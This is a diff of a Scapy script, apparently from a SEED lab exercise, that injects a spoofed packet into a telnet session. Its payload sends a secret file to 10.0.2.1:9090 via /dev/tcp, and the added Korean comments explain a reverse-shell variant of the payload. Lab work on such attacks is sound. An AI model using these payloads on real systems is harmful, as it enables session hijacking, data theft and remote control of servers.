@@ -290,6 +290,8 @@ print("SENDING SESSION HIJACKING PACKET.........")
 IPLayer = IP(src="10.0.2.68", dst="10.0.2.69")
 TCPLayer = TCP(sport=46716, dport=23, flags="A", seq=956606610, ack-3791760010)
 Data = "\r cat /home/seed/secret > /dev/tcp/10.0.2.1/9090\r"
+# 만약 data를 "\r /bin/bash -i > /dev/tcp/10.0.2.1/9090 2>&1 \r" 로 바뀐다면, 연결이 설정되면 공격자는 Server에서 실행되는 쉘 프로그램을 제어하게 됨
+# bash 프로그램은 표준 출력장비와 표준 오류 장치를 모두 사용하므로, 둘다 TCP 가상 파일로 재지정해야됨
 pkt = IP Layer/TCPLayer/Data
 ls(pkt)
 send(pkt,verbose=0)
